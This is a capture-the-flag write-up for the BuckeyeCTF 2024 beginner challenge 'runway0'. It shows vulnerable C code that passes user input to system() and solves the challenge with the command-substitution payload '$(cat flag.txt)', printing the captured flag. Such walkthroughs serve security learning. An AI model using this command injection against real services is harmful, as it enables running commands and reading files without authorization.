# runway0 [347 solves]
### Challenge Description
> If you've never done a CTF before, this runway should help!

`nc challs.pwnoh.io 13400`
### Challenge Author 
> Author: kanderoo
# Challenge Files 
we are given with the source file that was used for compiling the binary
```c filename=runway0.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main() {
    char command[110] = "cowsay \"";
    char message[100];

    printf("Give me a message to say!\n");
    fflush(stdout);

    fgets(message, 0x100, stdin);

    strncat(command, message, 98);
    strncat(command, "\"", 2);

    system(command);
}
```
# Solution
i tried playing around with the instance. an input string such as `echo hello` resulted in 

```bash
fooker@fooker:~/buckeyectf2024/pwn/runway0$ nc challs.pwnoh.io 13400
Give me a message to say!
echo hello
 _____________
< echo hello  >
 -------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
fooker@fooker:~/buckeyectf2024/pwn/runway0$
```
i thought maybe i could break out of the `cowsay` command and execute shell commands but that didn't work. 
## Command Substitution
In bash, using `$()` allows us to execute anything within the parantheses inside ta subshell and replace the command by the output generated. Therefore, if we craft the following payload
```payload.txt
$(cat flag.txt)
```

then that should give us a shell!
```bash
fooker@fooker:~/buckeyectf2024/pwn/runway0$ nc challs.pwnoh.io 13400
Give me a message to say!
$(cat flag.txt)
 _________________________________________
/ bctf{0v3rfl0w_th3_M00m0ry_2d310e3de2866 \
\ 58e}                                    /
 -----------------------------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
fooker@fooker:~/buckeyectf2024/pwn/runway0$
```
and that gives us the flag.
## Flag
`bctf{0v3rfl0w_th3_M00m0ry_2d310e3de286658e}`

